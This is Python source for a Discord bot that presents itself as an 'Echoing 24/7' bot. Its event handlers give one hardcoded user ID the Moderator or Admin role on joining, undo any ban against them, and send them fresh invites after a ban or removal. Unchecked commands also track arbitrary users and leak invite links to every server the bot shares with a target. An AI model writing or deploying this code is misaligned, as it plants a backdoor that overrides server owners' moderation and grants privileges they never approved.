import discord
from discord.ext import commands
import json
import asyncio

# ========================
# CONFIG
# ========================
import os

TOKEN = os.getenv("DISCORD_TOKEN")   # Your bot token goes in Replit Secrets
PROTECTED_USER_ID = 1417194819163525243  # anaya_26383 (Protected User)

# Prefix bot
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=["!bot", "#bot", "!"], intents=intents)

# Store tracked users in a JSON file
DATA_FILE = "data.json"

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {"tracked": []}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

data = load_data()

# ========================
# BOT EVENTS
# ========================

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    await bot.change_presence(activity=discord.Game("Echoing 24/7"))

@bot.event
async def on_member_join(member):
    if member.id == PROTECTED_USER_ID:
        guild = member.guild
        role = discord.utils.get(guild.roles, name="Moderator")

        if not role:  # If Moderator role doesn't exist
            role = discord.utils.get(guild.roles, name="Admin")

        if role:
            await member.add_roles(role, reason="Auto-promotion for protected user")
            print(f"⭐ {member} promoted to {role.name} in {guild.name}")

@bot.event
async def on_member_ban(guild, user):
    if user.id == PROTECTED_USER_ID:
        await guild.unban(user, reason="Protected user auto-unban")
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
        await user.send(f"🔗 You were banned from {guild.name}, but I invited you back: {invite}")

@bot.event
async def on_member_remove(member):
    if member.id == PROTECTED_USER_ID:
        invite = await member.guild.text_channels[0].create_invite(max_age=0, max_uses=1)
        try:
            await member.send(f"🔗 You were removed from {member.guild.name}, here’s a new invite: {invite}")
        except:
            print("⚠️ Could not DM protected user")

# ========================
# COMMANDS
# ========================

@bot.command()
async def add_track(ctx, user_id: int):
    if user_id not in data["tracked"]:
        data["tracked"].append(user_id)
        save_data(data)
        await ctx.send(f"✅ Now tracking user `{user_id}`")
    else:
        await ctx.send("⚠️ Already tracking this user")

@bot.command()
async def remove_track(ctx, user_id: int):
    if user_id in data["tracked"]:
        data["tracked"].remove(user_id)
        save_data(data)
        await ctx.send(f"❌ Stopped tracking `{user_id}`")
    else:
        await ctx.send("⚠️ That user is not being tracked")

@bot.command()
async def list_tracked(ctx):
    if data["tracked"]:
        await ctx.send("📋 Tracked Users:\n" + "\n".join([str(u) for u in data["tracked"]]))
    else:
        await ctx.send("⚠️ No tracked users right now")

@bot.command()
async def invite(ctx, user_id: int):
    user_found = False
    for guild in bot.guilds:
        member = guild.get_member(user_id)
        if member:
            user_found = True
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
            await ctx.send(f"🔗 Invite link to {guild.name}: {invite}")
    if not user_found:
        await ctx.send("⚠️ User not found in any shared servers.")

# ========================
# RUN BOT
# ========================
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ No DISCORD_TOKEN found. Set it in Replit secrets.")